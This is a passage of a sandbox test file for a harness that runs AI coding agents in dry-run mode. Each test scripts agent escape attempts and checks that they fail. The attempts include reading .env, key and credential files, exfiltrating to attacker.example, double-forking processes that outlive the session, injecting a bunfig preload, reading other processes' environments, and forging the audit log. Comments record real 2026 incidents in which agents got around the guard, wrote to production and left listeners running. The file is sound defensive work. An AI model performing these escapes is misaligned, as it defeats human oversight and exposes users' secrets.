    expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
    expect(h.recorded("bash")).toContain("dry run: 'cast task create Something' would write, and is refused");
    expect(fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8")).toBe("task create Something\nREFUSED task create Something\n");
  }, 60_000);

  // 2026-10-05: agents left running after their harness was killed went around the guard with the
  // real state directory and wrote proposals to prod. Every route they had is tried here.
  test.if(process.platform === "darwin")("an agent that goes around the guard finds no sign-in, and the broker runs only reads", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    write(path.join(h.state, "config.json"), '{"auth_token":"SIGN-IN-SENTINEL"}');
    const main = path.join(import.meta.dir, "..", "src", "main.ts");
    const planted = path.join(import.meta.dir, "prompt-dry-run-bin", `planted-${process.pid}`);
    const bash = [
      `cat '${h.state}/config.json' 2>&1 | sed 's/^/cat: /'`,
      `ls '${h.state}' 2>&1 | sed 's/^/ls: /'`,
      `echo "env: $(env | grep -c 'SIGN-IN-SENTINE[L]')"`,
      `echo "real-dir: \${DRY_RUN_REAL_CODECAST_DIR:-unset}"`,
      "cast task ls 2>&1 | sed 's/^/read: /'",
      `printf 'task\\0create\\0Escaped\\0' | curl -sS --data-binary @- "$DRY_RUN_BROKER" 2>&1 | sed 's/^/broker: /'`,
      `CODECAST_DIR='${h.state}' '${process.execPath}' '${main}' task create Escaped2 2>&1 | head -2 | sed 's/^/main: /'`,
      `( : > '${planted}' ) 2>&1 | sed 's/^/plant: /'`,
    ].join("; ");
    try {
      expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
      const said = h.recorded("bash")!;
      expect(said).not.toContain("SIGN-IN-SENTINEL");
      expect(said).toMatch(/cat: .*Operation not permitted/);
      expect(said).toMatch(/ls: .*Operation not permitted/);
      expect(said).toContain("env: 0");
      expect(said).toContain("real-dir: unset");
      // A read still reaches the real CLI under the real state dir, through the harness.
      expect(said).toContain(`read: LIVE task ls dir=${h.state}`);
      expect(said).toContain("broker: dry run: 'cast task create Escaped' would write, and is refused");
      expect(said).toMatch(/main: .*(EPERM|not permitted)/);
      expect(said).toMatch(/plant: .*Operation not permitted/);
      expect(fs.existsSync(planted)).toBe(false);
      const real = h.recorded("real-calls")!;
      expect(real).toContain(`task ls dir=${h.state}`);
      expect(real).not.toContain("create");
      const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
      expect(log).toContain("LIVE task ls\n");
      expect(log).toContain("REFUSED task create Escaped\n");
    } finally {
      fs.rmSync(planted, { force: true });
    }
  }, 90_000);

  // The line workspace's Try (cli lineTry.ts) promises nothing ships: a station replayed in a real
  // checkout writes no file, and reaches no service it could write to (gh, a git remote), only the model.
  test.if(process.platform === "darwin")("--read-only refuses file writes in the checkout and every connection but the model's and the broker's", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    // Outside the per-user temp root, which the sandbox leaves writable for Claude Code's own caches.
    const checkout = path.join(import.meta.dir, `.ro-checkout-${process.pid}`);
    fs.mkdirSync(checkout, { recursive: true });
    const bash = [
      `( : > '${checkout}/probe.txt' ) 2>&1 | sed 's/^/write: /'`,
      `/usr/bin/nc -z -G 3 1.1.1.1 443 2>&1 && echo "direct: connected" || echo "direct: refused"`,
      `echo "proxy: \${HTTPS_PROXY:-none}"`,
      `curl -sS -o /dev/null --max-time 10 https://github.com 2>&1 | sed 's/^/github: /'`,
      "cast task ls 2>&1 | sed 's/^/read: /'",
    ].join("; ");
    try {
      const r = h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--cwd", checkout, "--read-only");
      expect(r.err).toBe("");
      expect(r.code).toBe(0);
      const said = h.recorded("bash")!;
      expect(said).toMatch(/write: .*Operation not permitted/);
      expect(fs.existsSync(path.join(checkout, "probe.txt"))).toBe(false);
      expect(said).toContain("direct: refused");
      expect(said).toMatch(/proxy: http:\/\/127\.0\.0\.1:\d+/);
      expect(said).toMatch(/github: .*403/);
      expect(said).toContain(`read: LIVE task ls dir=${h.state}`);
    } finally {
      fs.rmSync(checkout, { recursive: true, force: true });
    }
  }, 90_000);

  // Each escape a guidance replay took on 2026-11-16 (ct-95483), tried by one rep: it listed a checkout's
  // secrets through its secret skill, fetched an OAuth client, wrote a catcher under the real ~/.cache and
  // left it listening on 127.0.0.1:8794 after the rep. Every one must fail, and nothing may outlive the rep.
  // A Python outside the system's own, whose environment ps can read (it hides that of /usr/bin binaries).
  const PYTHON = ["/opt/homebrew/bin/python3", "/usr/local/bin/python3"].find((p) => fs.existsSync(p));
  test.if(process.platform === "darwin" && !!PYTHON)("a replayed agent reads, writes and reaches nothing real, and leaves nothing running", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    // The real machine as the agent would find it: another repo with a .env and a secret skill under the home folder.
    const other = path.join(h.dir, "src", "union-mobile", "outreach");
    write(path.join(other, ".env"), "GOOGLE_ADS_CLIENT_SECRET=real\n");
    write(path.join(other, ".claude", "skills", "secret", "scripts", "secret"), "#!/bin/sh\necho GOOGLE_ADS_CLIENT_SECRET\n", 0o755);
    // The tree the agent is given to read holds the same two, which stay unreadable even there.
    const checkout = path.join(import.meta.dir, `.closed-checkout-${process.pid}`);
    write(path.join(checkout, "README.md"), "readable\n");
    write(path.join(checkout, ".env.local"), "TOKEN=real\n");
    write(path.join(checkout, ".claude", "skills", "secret", "SKILL.md"), "secret\n");
    // Review finding 6 (2026-11-16): secret shapes beyond .env.
    for (const f of [".envrc", ".dev.vars", "deploy.pem", "id_ed25519", "service-account-prod.json", ".npmrc", ".netrc"]) write(path.join(checkout, f), "secret\n");
    const t = (name: string, cmd: string) => `( ${cmd} ) >/dev/null 2>&1; echo "${name} $?"`;
    const bash = [
      // Processes that leave the agent's process group (double fork + setsid), as nohup or a tmux server would:
      // one a non-system binary (its tag shows; the 2026-11-16 catcher was Homebrew python), one a system binary standing in the run dir (its cwd shows).
      `/usr/bin/perl -e 'use POSIX; fork and exit; POSIX::setsid(); fork and exit; open(my $f, ">", "$ENV{FAKE_CLAUDE_REC}/lingerer"); print $f $$; close $f; exec "${PYTHON}", "-c", "import time; time.sleep(300)"'`,
      `( cd "$FAKE_CLAUDE_REC" && /usr/bin/perl -e 'use POSIX; fork and exit; POSIX::setsid(); fork and exit; open(my $f, ">", "$ENV{FAKE_CLAUDE_REC}/lingerer2"); print $f $$; close $f; exec "/bin/sleep", "300"' )`,
      t("list-home", `ls '${h.dir}'`),
      t("read-other-repo", `cat '${other}/.env'`),
      t("run-other-secret-skill", `'${other}/.claude/skills/secret/scripts/secret' list`),
      t("read-checkout", "cat README.md"),
      t("read-checkout-env", "cat .env.local"),
      t("read-checkout-secret-skill", "cat .claude/skills/secret/SKILL.md"),
      ...[".envrc", ".dev.vars", "deploy.pem", "id_ed25519", "service-account-prod.json", ".npmrc", ".netrc"].map((f) => t(`read-checkout-${f}`, `cat ${f}`)),
      t("write-user-cache", `: > "$(getconf DARWIN_USER_CACHE_DIR)dry-run-probe-$$"`),
      t("write-real-cache", `mkdir -p '${h.dir}/.cache/gadsoauth' && : > '${h.dir}/.cache/gadsoauth/catcher.py'`),
      t("write-checkout", ": > probe.txt"),
      t("curl-via-proxy", "curl -sSf --max-time 10 https://oauth2.googleapis.com/token"),
      t("curl-direct", "curl -sSf --noproxy '*' --max-time 5 https://1.1.1.1"),
      t("listen-8794", `/usr/bin/perl -MIO::Socket::INET -e 'exit(IO::Socket::INET->new(Listen => 1, LocalAddr => "127.0.0.1", LocalPort => 8794, ReuseAddr => 1) ? 0 : 1)'`),
      t("cast-vault", "cast vault get GOOGLE_ADS_CLIENT_SECRET"),
      t("env-credential", '[ -n "${FOO_API_TOKEN:-}" ]'),
      "sleep 1",
      // Both still running when the agent's turn ends: what the sweep must then kill.
      'for n in lingerer lingerer2; do kill -0 "$(cat "$FAKE_CLAUDE_REC/$n")" 2>/dev/null && echo "$n-alive 0" || echo "$n-alive 1"; done',
    ].join("; ");
    try {
      const r = h.runWith({ FAKE_CLAUDE_BASH: bash, FOO_API_TOKEN: "s3cret" }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--cwd", checkout);
      expect(r.err).toBe("");
      expect(r.code).toBe(0);
      const results = Object.fromEntries(h.recorded("bash")!.trim().split("\n").map((l) => l.split(" ")));
      // The one thing it may do: read the tree it was given.
      expect(results["read-checkout"]).toBe("0");
      for (const escape of ["list-home", "read-other-repo", "run-other-secret-skill", "read-checkout-env", "read-checkout-secret-skill", "write-real-cache", "write-checkout", "curl-via-proxy", "curl-direct", "listen-8794", "cast-vault", "env-credential", "write-user-cache", ...[".envrc", ".dev.vars", "deploy.pem", "id_ed25519", "service-account-prod.json", ".npmrc", ".netrc"].map((f) => `read-checkout-${f}`)]) {
        expect({ escape, rc: results[escape] }).not.toEqual({ escape, rc: "0" });
      }
      expect(fs.existsSync(path.join(h.dir, ".cache", "gadsoauth"))).toBe(false);
      expect(fs.existsSync(path.join(checkout, "probe.txt"))).toBe(false);
      expect(h.recorded("real-calls") ?? "").not.toContain("vault");
      expect(fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8")).toContain("REFUSED vault get GOOGLE_ADS_CLIENT_SECRET");
      const alive = (pid: number) => { try { process.kill(pid, 0); return true; } catch { return false; } };
      expect([results["lingerer-alive"], results["lingerer2-alive"]]).toEqual(["0", "0"]);
      for (const name of ["lingerer", "lingerer2"]) {
        const pid = Number(h.recorded(name));
        expect({ name, pid: pid > 0 }).toEqual({ name, pid: true });
        expect({ name, alive: alive(pid) }).toEqual({ name, alive: false });
      }
      expect(Number(fs.readFileSync(path.join(h.runDir, "swept.txt"), "utf8"))).toBeGreaterThanOrEqual(2);
    } finally {
      fs.rmSync(checkout, { recursive: true, force: true });
    }
  }, 90_000);

  // Review finding 1 (2026-11-16): the broker ran the guard outside the sandbox, with the real home folder, in a
  // directory the agent chose (or its run dir), so a bunfig.toml preload there ran the agent's code unsandboxed;
  // and it wrote each live read's copy into the run dir, through any link the agent had planted there.
  test.if(process.platform === "darwin")("the broker runs no code the agent planted and writes nothing where the agent points", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const pwned = path.join(h.dir, "pwned");
    const victim = path.join(h.dir, "victim.txt");
    write(victim, "untouched\n");
    // The real CLI as a bun program (a dev checkout's cast is `bun main.ts`, and a compiled one loads bunfig.toml too).
    write(path.join(h.bin, "cast"), [
      `#!${process.execPath}`,
      'if (process.env.FAKE_CLAUDE_REC) require("fs").appendFileSync(`${process.env.FAKE_CLAUDE_REC}/real-calls`, `${process.argv.slice(2).join(" ")} dir=${process.env.CODECAST_DIR ?? ""}\\n`);',
      'console.log(`LIVE ${process.argv.slice(2).join(" ")}`);',
      "",
    ].join("\n"), 0o755);
    // The live read's copy, aimed at a file outside the run, planted again before each call.
    const plant = `k=$(printf 'task\\037ls\\037' | shasum -a 256 | cut -d' ' -f1); rm -f "$RUN_DIR/live-reads/$k.out"; ln -s '${victim}' "$RUN_DIR/live-reads/$k.out"`;
    const bash = [
      `printf 'preload = ["./p.ts"]\\n' > bunfig.toml`,
      `printf 'require("fs").writeFileSync(${JSON.stringify(pwned)}, "ran")\\n' > p.ts`,
      "cp bunfig.toml p.ts \"$RUN_DIR/\" 2>/dev/null",
      "cast task ls > /dev/null 2>&1",
      plant, `printf 'task\\0ls\\0' | curl -sS -H "X-Dry-Run-Cwd: $PWD" --data-binary @- "$DRY_RUN_BROKER" > /dev/null 2>&1`,
      plant, `printf 'task\\0ls\\0' | curl -sS -H "X-Dry-Run-Cwd: $RUN_DIR" --data-binary @- "$DRY_RUN_BROKER" > /dev/null 2>&1`,
      plant, `printf 'task\\0ls\\0' | curl -sS --data-binary @- "$DRY_RUN_BROKER" > /dev/null 2>&1`,
    ].join("; ");
    const r = h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake");
    expect(r.err).toBe("");
    expect(r.code).toBe(0);
    expect(h.recorded("real-calls")).toContain("task ls");
    expect(fs.existsSync(pwned)).toBe(false);
    expect(fs.readFileSync(victim, "utf8")).toBe("untouched\n");
  }, 60_000);

  // Review finding 2 (2026-11-16): sysctl KERN_PROCARGS2 handed the agent every same-user process's environment,
  // the harness's own (and through it the launching shell's tokens) included.
  test.if(process.platform === "darwin")("an agent cannot read another process's environment, the harness's included", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const probe = path.join(h.rec, "procargs.js");
    write(probe, [
      'const { dlopen, FFIType, ptr } = require("bun:ffi");',
      'const { symbols } = dlopen("/usr/lib/libSystem.B.dylib", { sysctl: { args: [FFIType.ptr, FFIType.u32, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.u64], returns: FFIType.i32 } });',
      "const mib = new Int32Array([1, 49, Number(process.argv[2])]); const buf = new Uint8Array(1 << 16); const size = new BigUint64Array([BigInt(buf.length)]);",
      'const rc = symbols.sysctl(ptr(mib), 3, ptr(buf), ptr(size), null, 0);',
      'console.log(rc === 0 && Buffer.from(buf.slice(0, Number(size[0]))).toString("latin1").includes("PROC-ENV-SENTINEL") ? "read" : "refused");',
    ].join("\n"));
    const bash = [
      `echo "parent: $('${process.execPath}' '${probe}' $PPID)"`,
      // The model is reached through the harness, which alone holds the login: anything but the model's endpoints is refused.
      `echo "account: $(curl -s -o /dev/null -w '%{http_code}' "$ANTHROPIC_BASE_URL/api/oauth/profile")"`,
    ].join("; ");
    expect(h.runWith({ FAKE_CLAUDE_BASH: bash, PROBE_TOKEN: "PROC-ENV-SENTINEL" }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
    expect(h.recorded("bash")).toContain("parent: refused");
    expect(h.recorded("bash")).toContain("account: 403");
    // Claude Code in the sandbox holds a placeholder: the login (here "fake-token") never enters any process the agent can read.
    expect(h.recorded("env")!.split("\n")[2]).toBe("sk-ant-oat01-dry-run-placeholder");
  }, 60_000);

  // Review findings 3, 5 and 7 (2026-11-16): the fake's world raced under parallel calls, a failed write was logged
  // (and judged) as done, and calls.log and the world sat where the agent could forge them.
  test.if(process.platform === "darwin")("the fake answers from the harness: parallel calls each land, failures stay failures, and nothing it records can be forged", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const fake = path.join(h.dir, "fake.ts");
    write(fake, [
      'import { existsSync, readFileSync, writeFileSync } from "node:fs";',
      "export function openFake(o: { worldPath: string; tree: unknown }) {",
      "  if (!o.tree) throw new Error('no tree');",
      "  return (argv: string[]) => {",
      "    const w = existsSync(o.worldPath) ? JSON.parse(readFileSync(o.worldPath, 'utf8')) : { n: 0, tasks: [] };",
      "    if (argv[0] === 'task' && argv[1] === 'create') { const id = `ct-${9000 + ++w.n}`; w.tasks.push(id); writeFileSync(o.worldPath, JSON.stringify(w)); return { out: `ok Created ${id}\\n`, exit: 0 }; }",
      "    if (argv[0] === 'send') return { out: 'Error: Conversation not found\\n', exit: 1 };",
      "    return null;",
      "  };",
      "}",
    ].join("\n"));
    write(path.join(h.bin, "cast"), [
      "#!/usr/bin/env bash",
      'if [ "$1" = agent-context ]; then echo \'{"commands":[]}\'; exit 0; fi',
      'printf "%s dir=%s\\n" "$*" "${CODECAST_DIR:-}" >> "$FAKE_CLAUDE_REC/real-calls"',
      'echo "LIVE $* dir=${CODECAST_DIR:-}"',
      "",
    ].join("\n"), 0o755);
    const bash = [
      'for i in 1 2 3 4 5 6; do cast task create "T$i" > "$FAKE_CLAUDE_REC/create-$i" 2>&1 & done; wait',
      "cast send jx7nope hi > /dev/null 2>&1; echo \"send-rc $?\"",
      'echo "FAKED send jx7forged hi" >> "$RUN_DIR/calls.log"',
      '( : > "${RUN_DIR}.harness/fake-world.json" ) 2>/dev/null && echo "world-write 0" || echo "world-write 1"',
    ].join("; ");
    expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--fake", fake).code).toBe(0);
    const ids = [1, 2, 3, 4, 5, 6].map((i) => /ct-\d+/.exec(h.recorded(`create-${i}`) ?? "")?.[0]);
    expect(new Set(ids).size).toBe(6);
    expect(JSON.parse(fs.readFileSync(`${h.runDir}.harness/fake-world.json`, "utf8")).tasks).toHaveLength(6);
    expect(h.recorded("bash")).toContain("send-rc 1");
    expect(h.recorded("bash")).toContain("world-write 1");
    const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
    expect(log.match(/^FAKED task create/gm)).toHaveLength(6);
    expect(log).toContain("FAKEERR send jx7nope hi");
    expect(log).not.toContain("FAKED send");
    expect(log).not.toContain("jx7forged");
  }, 60_000);

  // Round-2 review (2026-11-16): an interpreter on PATH under ~/.local opened all of ~/.local (the evals home, tools'
  // tokens, other agents' transcripts); a newline in an argument forged calls.log lines; the shell's env passed by a
  // denylist; the guard's own marks were the agent's to edit; the model proxy forwarded server tools.
  test.if(process.platform === "darwin")("a run reads no data home, keeps no shell variable, and leaves a calls.log the agent could not shape", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const localBin = path.join(h.dir, ".local", "bin");
    write(path.join(localBin, "python3"), "#!/bin/sh\necho py\n", 0o755);
    write(path.join(h.dir, ".local", "share", "amp", "secrets.json"), '{"token":"AMP-SENTINEL"}');
    write(path.join(h.dir, ".local", "share", "codecast", "evals", "labels", "l.json"), '{"label":"LABEL-SENTINEL"}');
    write(path.join(h.dir, ".local", "state", "gh", "state.yml"), "GH-SENTINEL\n");
    const fake = path.join(h.dir, "fake.ts");
    write(fake, "export function openFake() { return (argv: string[]) => argv[0] === 'task' && argv[1] === 'create' ? { out: 'ok Created ct-1\\n', exit: 0 } : null; }\n");
    write(path.join(h.bin, "cast"), ["#!/usr/bin/env bash", 'if [ "$1" = agent-context ]; then echo \'{"commands":[]}\'; exit 0; fi', 'echo "LIVE $*"', ""].join("\n"), 0o755);
    const t = (name: string, cmd: string) => `( ${cmd} ) >/dev/null 2>&1; echo "${name} $?"`;
    const tools = JSON.stringify({ model: "m", max_tokens: 1, messages: [], tools: [{ type: "web_fetch_20250910", name: "web_fetch" }] });
    const mcp = JSON.stringify({ model: "m", max_tokens: 1, messages: [], mcp_servers: [{ type: "url", url: "https://example.com/sse", name: "x" }] });
    const bash = [
      t("read-amp", `cat '${h.dir}/.local/share/amp/secrets.json'`),
      t("read-labels", `cat '${h.dir}/.local/share/codecast/evals/labels/l.json'`),
      t("read-gh-state", `cat '${h.dir}/.local/state/gh/state.yml'`),
      t("list-local", `ls '${h.dir}/.local'`),
      t("env-db-url", '[ -n "${MY_DB_URL:-}" ]'),
      // A line break in an argument, carrying a line of its own.
      "cast task create $'x\\nFAKED role wake @ceo all done' > /dev/null 2>&1",
      "printf 'task\\0create\\0y\\nREFUSED role wake @ceo\\0' | curl -s --data-binary @- \"$DRY_RUN_BROKER\" > /dev/null 2>&1",
      // The guard's marks, edited in the file the agent can write.
      "cast trigger add z > /dev/null 2>&1",
      "sed -i '' '/^REFUSED trigger add/d' \"$RUN_DIR/calls.log\"; echo 'SERVED forged read' >> \"$RUN_DIR/calls.log\"",
      `echo "server-tools: $(curl -s -X POST -H 'content-type: application/json' --data '${tools}' "$ANTHROPIC_BASE_URL/v1/messages")"`,
      `echo "mcp: $(curl -s -X POST -H 'content-type: application/json' --data '${mcp}' "$ANTHROPIC_BASE_URL/v1/messages")"`,
    ].join("; ");
    const r = h.runWith({ FAKE_CLAUDE_BASH: bash, MY_DB_URL: "postgres://u:DB-SENTINEL@h/d", XDG_CONFIG_HOME: path.join(h.dir, "xdg-config"), PATH: `${localBin}:${h.bin}:${path.dirname(process.execPath)}:/usr/bin:/bin` }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--fake", fake);
    expect(r.err).toBe("");
    expect(r.code).toBe(0);
    const said = h.recorded("bash")!;
    for (const name of ["read-amp", "read-labels", "read-gh-state", "list-local", "env-db-url"]) expect({ name, ok: said.includes(`${name} 0`) }).toEqual({ name, ok: false });
    expect(said).toMatch(/server-tools: dry run: server tools are not available here \(web_fetch_20250910\)/);
    expect(said).toMatch(/mcp: dry run: mcp_servers would reach other hosts/);
    const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
    expect(log).not.toMatch(/^FAKED role wake/m);
    expect(log).not.toMatch(/^REFUSED role wake/m);
    expect(log).toContain("FAKED task create 'x\\nFAKED role wake @ceo all done'");
    expect(log).toContain("REFUSED trigger add z");
    expect(log).not.toContain("SERVED forged read");
  }, 60_000);

  test.if(process.platform === "darwin")("the broker reads with the shell's own config homes, not the agent's", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    write(path.join(h.bin, "cast"), ["#!/usr/bin/env bash", 'printf "%s xdg=%s\\n" "$*" "${XDG_CONFIG_HOME:-unset}" >> "$FAKE_CLAUDE_REC/real-calls"', 'echo "LIVE $*"', ""].join("\n"), 0o755);
    const xdg = path.join(h.dir, "xdg-config");
    expect(h.runWith({ FAKE_CLAUDE_BASH: "cast task ls > /dev/null 2>&1", XDG_CONFIG_HOME: xdg }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
    expect(h.recorded("real-calls")).toContain(`task ls xdg=${xdg}`);
  }, 60_000);

  // Round-3 review (2026-11-16): a URL source in a message made Anthropic fetch any host; an agent kept calls out of
  // the record (DRY_RUN_PREFLIGHT=1, a stripped DRY_RUN_BROKER) and posted marks no call earned.
  test.if(process.platform === "darwin")("no message fetches a URL, and every call the agent made is in the record with the mark it earned", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    // The stub's own Bash command, as Claude Code's stream records it, so the harness can set the record against it.
    const cmds = ["DRY_RUN_PREFLIGHT=1 cast task create hidden-one", "env -u DRY_RUN_BROKER -u DRY_RUN_FAKE_VIA_BROKER cast task create hidden-two"];
    write(path.join(h.rec, "stream.jsonl"), [
      ...cmds.map((command, i) => JSON.stringify({ type: "assistant", message: { content: [{ type: "tool_use", id: `t${i}`, name: "Bash", input: { command } }] } })),
      JSON.stringify({ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }),
    ].join("\n") + "\n");
    const image = JSON.stringify({ model: "m", max_tokens: 1, messages: [{ role: "user", content: [{ type: "image", source: { type: "url", url: "https://attacker.example/?d=secret" } }] }] });
    const bash = [
      ...cmds.map((c) => `${c} > /dev/null 2>&1`),
      // Marks no call earned: a SERVED for a read the record does not hold, and a LIVE the broker never ran.
      `id=$(printf 'task\\0show\\0ct-999\\0' | curl -s --data-binary @- "\${DRY_RUN_BROKER%/read}/begin"); printf "%s\\0SERVED" "$id" | curl -s -o /dev/null -w "forged-served %{http_code}\\n" --data-binary @- "\${DRY_RUN_BROKER%/read}/mark"`,
      `id=$(printf 'task\\0ls\\0' | curl -s --data-binary @- "\${DRY_RUN_BROKER%/read}/begin"); printf "%s\\0LIVE" "$id" | curl -s -o /dev/null -w "forged-live %{http_code}\\n" --data-binary @- "\${DRY_RUN_BROKER%/read}/mark"`,
      `echo "url-source: $(curl -s -X POST -H 'content-type: application/json' --data '${image}' "$ANTHROPIC_BASE_URL/v1/messages")"`,
    ].join("; ");
    expect(h.runWith({ FAKE_CLAUDE_BASH: bash }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake").code).toBe(0);
    const said = h.recorded("bash")!;
    expect(said).toContain("forged-served 400");
    expect(said).toContain("forged-live 400");
    expect(said).toMatch(/url-source: dry run: content Anthropic would fetch from a URL is not available here/);
    const log = fs.readFileSync(path.join(h.runDir, "calls.log"), "utf8");
    expect(log).toContain("REFUSED task create hidden-one");
    expect(log).toContain("REFUSED task create hidden-two");
    expect(log).not.toMatch(/^(SERVED task show ct-999|LIVE task ls)$/m);
  }, 60_000);

  // Round-3 review (2026-11-16): line replays broke in the closed world: a --shared clone's objects and a worktree's
  // common dir sit in the real checkout, its node_modules link there, and its read-only database URL is a .env.
  test.if(process.platform === "darwin")("a replayed checkout works: git through a worktree or a shared clone, linked dependencies, the run's own env file", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const repos = path.join(h.dir, "repos");
    const main = path.join(repos, "main");
    fs.mkdirSync(main, { recursive: true });
    const git = (cwd: string, ...args: string[]) => { const r = Bun.spawnSync(["git", "-C", cwd, ...args], { env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } }); if (r.exitCode !== 0) throw new Error(r.stderr.toString()); };
    git(main, "init", "-q", "-b", "main");
    write(path.join(main, "a.txt"), "a\n");
    git(main, "add", "a.txt");
    git(main, "commit", "-q", "-m", "first-commit");
    git(main, "worktree", "add", "-q", path.join(repos, "wt"));
    const deps = path.join(repos, "deps", "node_modules");
    write(path.join(deps, "dep", "package.json"), '{"name":"dep"}\n');
    fs.mkdirSync(h.runDir, { recursive: true });
    const tree = path.join(h.runDir, "tree");
    git(h.runDir, "clone", "-q", "--shared", main, tree);
    fs.symlinkSync(deps, path.join(tree, "node_modules"));
    write(path.join(tree, ".env.replay"), "DATABASE_URL=postgres://reader@127.0.0.1:1/db\n");
    const t = (name: string, cmd: string) => `( ${cmd} ) >/dev/null 2>&1; echo "${name} $?"`;
    const clone = [t("clone-log", "git log -1 --format=%s"), t("clone-deps", "cat node_modules/dep/package.json"), t("clone-env", "cat .env.replay")].join("; ");
    const r = h.runWith({ FAKE_CLAUDE_BASH: clone }, "--run", h.runDir, "--prompt", h.prompt, "--model", "m", "--account", "fake", "--cwd", tree, "--read", deps);
    expect(r.err).toBe("");
    expect(r.code).toBe(0);
    for (const name of ["clone-log", "clone-deps", "clone-env"]) expect(h.recorded("bash")).toContain(`${name} 0`);
    // A Try station in a worktree of the real checkout: its .git is a file pointing into the main checkout's .git,
    // which also holds another session's stash and tools' data (round-4 review): git works, those stay closed.
    write(path.join(main, "a.txt"), "someone else's uncommitted work\n");
    git(main, "stash", "-q");
    write(path.join(main, ".git", "codecast-tool", "state.json"), '{"tool":"data"}\n');
    const common = fs.realpathSync(path.join(main, ".git"));
    const h2 = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const wtBash = [
      `echo "worktree-msg $(git log -1 --format=%s 2>&1)"`,
      t("read-stash-ref", `cat '${common}/refs/stash'`),
      t("git-stash-list", "git stash list | grep -q ."),
      t("list-common", `ls '${common}'`),
      t("read-tool-data", `cat '${common}/codecast-tool/state.json'`),
    ].join("; ");
    const r2 = h2.runWith({ FAKE_CLAUDE_BASH: wtBash }, "--run", h2.runDir, "--prompt", h2.prompt, "--model", "m", "--account", "fake", "--cwd", path.join(repos, "wt"));
    expect(r2.err).toBe("");
    const wtSaid = h2.recorded("bash")!;
    expect(wtSaid).toContain("worktree-msg first-commit");
    for (const name of ["read-stash-ref", "git-stash-list", "list-common", "read-tool-data"]) expect({ name, ok: wtSaid.includes(`${name} 0`) }).toEqual({ name, ok: false });
  }, 60_000);

  // An evals run's dir and its baked guard sit inside the evals home, a closed data home: a path through it must still
  // resolve (round 5 found /usr/bin/env spinning on the guard's #!/usr/bin/env shebang there), and git must not climb
  // out of the run into whatever repository holds the evals home.
  test.if(process.platform === "darwin")("a run inside the evals home runs its guard, cast and git, and still lists nothing of the home", () => {
    const h = harnessWorld([{ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }]);
    const home = h.dir;
    Bun.spawnSync(["git", "init", "-q", home]);
    const run = path.join(home, ".local", "share", "codecast", "evals", "runs", "r1", "agent");
    fs.mkdirSync(path.join(run, ".rec"), { recursive: true });
    write(path.join(run, ".rec", "stream.jsonl"), JSON.stringify({ type: "result", result: "Done.", is_error: false, num_turns: 1, total_cost_usd: 0.01 }) + "\n");
    const bash = [
      `/usr/bin/perl -e 'alarm 20; exec @ARGV' git status --short > /dev/null 2>&1; echo "git $?"`,
      `/usr/bin/perl -e 'alarm 20; exec @ARGV' cast task ls > /dev/null 2>&1; echo "cast $?"`,
      `ls '${path.join(home, ".local", "share")}' > /dev/null 2>&1; echo "list-share $?"`,
    ].join("; ");
    const r = h.runWith({ FAKE_CLAUDE_BASH: bash, FAKE_CLAUDE_REC: path.join(run, ".rec"), FAKE_CLAUDE_STREAM: path.join(run, ".rec", "stream.jsonl") }, "--run", run, "--prompt", h.prompt, "--model", "m", "--account", "fake");
    expect(r.err).toBe("");
    const said = fs.readFileSync(path.join(run, ".rec", "bash"), "utf8");
    // Not a repository: git stopped at the run dir rather than walking the home's repository (128), and did not hang (142).
    expect(said).toContain("git 128");
    expect(said).toContain("cast 0");
    expect(said).not.toContain("list-share 0");
  }, 60_000);

  // Round-4 review (2026-11-16): a write run through a layer the end-of-run parse cannot see (a script, eval, a
  // subprocess) with DRY_RUN_BROKER blanked left no line; and a cast the shell never ran was counted as REFUSED.
